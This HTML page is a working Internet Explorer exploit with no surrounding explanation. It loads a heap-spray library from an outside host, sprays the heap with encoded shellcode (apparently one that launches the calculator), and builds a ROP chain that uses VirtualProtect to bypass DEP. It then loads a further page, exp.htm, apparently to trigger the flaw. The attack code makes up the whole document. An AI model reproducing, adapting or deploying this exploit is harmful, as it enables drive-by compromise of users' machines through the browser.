<html>
<body>
<script>
	var arr = new Array();
	arr[0] = window.document.createElement("img");
	arr[0]["src"] = "1";
</script>
<script type="text/javascript" src="http://pwdme.cc/heaplib.js"></script>
<script>
var heap_obj = new heapLib.ie(0x10000);

// var code_addr = unescape("%ucccc%ucccc");
var code = unescape("%ue8fc%u0082%u0000%u8960%u31e5%u64c0%u508b%u8b30%u0c52%u528b%u8b14%u2872%ub70f%u264a%uff31%u3cac%u7c61%u2c02%uc120%u0dcf%uc701%uf2e2%u5752%u528b%u8b10%u3c4a%u4c8b%u7811%u48e3%ud101%u8b51%u2059%ud301%u498b%ue318%u493a%u348b%u018b%u31d6%uacff%ucfc1%u010d%u38c7%u75e0%u03f6%uf87d%u7d3b%u7524%u58e4%u588b%u0124%u66d3%u0c8b%u8b4b%u1c58%ud301%u048b%u018b%u89d0%u2444%u5b24%u615b%u5a59%uff51%u5fe0%u5a5f%u128b%u8deb%u6a5d%u8d01%ub285%u0000%u5000%u3168%u6f8b%uff87%ubbd5%ub5f0%u56a2%ua668%ubd95%uff9d%u3cd5%u7c06%u800a%ue0fb%u0575%u47bb%u7213%u6a6f%u5300%ud5ff%u6163%u636c%u4100");	//Code to execute

var rop = unescape(
	"%u208c%u0040" + // 0x0040208c : ,# POP EBP # RETN [iexplore.exe] 
	"%u4141%u4141" +
	"%u208c%u0040" + // 0x0040208c : ,# skip 4 bytes [iexplore.exe]
	"%u2b2b%u0040" + // 0x00402b2b : ,# POP EBX # RETN [iexplore.exe] 
	"%u0201%u0000" + // 0x00000201 : ,# 0x00000201-> ebx
	"%ucb29%u77c1" + // 0x00000000 : ,# 0x77c1cb29
	"%u0040%u0000" + 
	"%u2070%u0040" + // 0x00402070 : ,# POP ECX # RETN [iexplore.exe] 
	"%ubfe2%u0040" + // 0x0040bfe2 : ,# &Writable location [iexplore.exe]
	"%u19ec%u0040" + // 0x004019ec : ,# POP EDI # POP ESI # RETN [iexplore.exe] 
	"%u1921%u0040" + // 0x00401921 : ,# RETN (ROP NOP) [iexplore.exe]
	"%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
	"%u187a%u0040" + // 0x0040187a : ,# POP ESI # RETN [iexplore.exe] 
	"%u9336%u0040" + // 0x00409336 : ,# JMP [EAX] [iexplore.exe]
	"%u2120%u0040" + // 0x00402120 : ,# POP EAX # POP EBP # RETN [iexplore.exe] 
	"%u121c%u75e0" + // 0x75e0121c : ,# ptr to &VirtualProtect() (skipped module criteria, check if pointer is reliable !) [IAT SXS.DLL]
	"%u0c68%u0c0c" + // 0x41414141 : ,# Filler (compensate)
	"%u2cec%u75e5" + // 0x75e52cec : ,# PUSHAD # RETN [SXS.DLL] 
	"%u318b%u7d5a" + // 0x7d5a318b : ,# jmp esp [shell32.dll]
"");

var padding = unescape("%u0c0c%u0c0c");
var padrop = unescape("%u0c10%u0c0c%u404b%u7d5d%u4343%u4343%u1b14%u5d1b");
//var stack_over = unescape();  // xchg eax,esp; ret

rop = padrop + rop;

while (padding.length < 0x1000) padding += padding; // create big block of nops

offset_length = 0x5F6;
junk_offset = padding.substring(0, offset_length);

var shellcode = junk_offset + rop + code + padding.substring(0, 0x800 - code.length - junk_offset.length - rop.length);

while (shellcode.length < 0x40000) shellcode += shellcode;

var block = shellcode.substring(2, 0x40000 - 0x21);
for (var i=0; i < 500; i++) {
    heap_obj.alloc(block);
}

</script>
<iframe src="exp.htm"></iframe>
</body>
</html>